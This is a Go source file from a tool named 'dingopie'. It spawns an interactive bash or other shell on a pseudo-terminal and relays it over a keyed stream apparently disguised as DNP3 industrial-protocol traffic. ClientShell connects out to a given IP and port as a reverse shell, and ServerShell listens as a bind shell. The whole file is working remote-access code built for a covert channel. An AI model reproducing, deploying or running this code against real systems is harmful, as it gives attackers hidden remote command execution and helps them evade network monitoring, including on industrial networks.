//go:build !windows

package shell

import (
	"fmt"
	"io"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/creack/pty"
)

// shell initiates an interactive shell session over the provided stream.
func shell(command string, stream dnp3Stream, maxDataLen int) error {
	var c *exec.Cmd

	if strings.HasSuffix(command, "bash") {
		rcContent := `PS1="dingopie> "`
		//nolint:gosec //G204 user provided command which they must have permissions to run
		c = exec.Command(
			"bash",
			"-c",
			fmt.Sprintf("exec %s --rcfile <(echo '%s') -i", command, rcContent),
		)
	} else {
		c = exec.Command(command)
	}

	ptmx, err := pty.Start(c)
	if err != nil {
		return fmt.Errorf("error starting pty: %w", err)
	}
	defer ptmx.Close()

	buf := make([]byte, maxDataLen)

	go func() { _, _ = io.Copy(ptmx, stream) }()

	_, _ = io.CopyBuffer(stream, ptmx, buf)

	fmt.Printf(">> Shell session ended\n")

	return nil
}

// ClientShell - dingopie client direct shell.
func ClientShell(ip string, port int, key, command string) error {
	conn, err := net.Dial("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error connecting: %w", err)
	}
	defer conn.Close()

	fmt.Printf(">> Connected to %s:%d\n", ip, port)

	stream := newClientStream(key, conn)

	return shell(command, stream, clientMaxDataLen)
}

// ServerShell - dingopie server direct shell.
func ServerShell(ip string, port int, key, command string) error {
	ln, err := net.Listen("tcp", net.JoinHostPort(ip, strconv.Itoa(port)))
	if err != nil {
		return fmt.Errorf("error starting TCP listener: %w", err)
	}
	defer ln.Close()

	fmt.Printf(">> Listening on %s:%d\n", ip, port)

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("error accepting connection: %w", err)
	}
	defer conn.Close()

	fmt.Printf("\tConnection %s\n", conn.RemoteAddr().String())
	stream := newServerStream(key, conn)

	return shell(command, stream, serverMaxDataLen)
}
